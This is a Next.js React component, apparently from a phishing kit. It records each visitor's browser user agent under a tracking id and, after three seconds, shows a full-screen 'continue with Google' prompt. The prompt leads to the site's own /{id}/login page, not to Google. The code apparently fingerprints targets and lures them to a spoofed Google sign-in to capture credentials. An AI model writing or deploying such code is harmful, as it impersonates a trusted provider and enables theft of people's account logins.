"use client";

import Image from "next/image";
import Link from "next/link";
import googleIcon from "@/public/image/google.jpg";
import { useEffect, useState } from "react";
import { getAgent } from "@/actions";

export default function MeetPopup({ id }) {
  const [popup, setPopup] = useState(false);

  useEffect(() => {
    const agent = window.navigator.userAgent;
    async function agentSend() {
      await getAgent(id, agent);
    }
    agentSend();
    setTimeout(() => {
      setPopup(true);
    }, 3000);
  }, [id]);
  return (
    <div
      onClick={() => {
        setPopup(false);
      }}
      className={`${
        popup
          ? "w-screen h-screen bg-gray-300 bg-blur-sm bg-opacity-90	 flex z-30 justify-center items-center absolute top-0 left-0 "
          : ""
      }`}
    >
      <Link
        href={`/${id}/login`}
        className="text-gray-800  flex justify-center  items-center bg-blue-200 rounded-3xl py-3 px-5"
      >
        <Image src={googleIcon} alt="google icon " width={30} height={30} />
        continue with Google
      </Link>
    </div>
  );
}
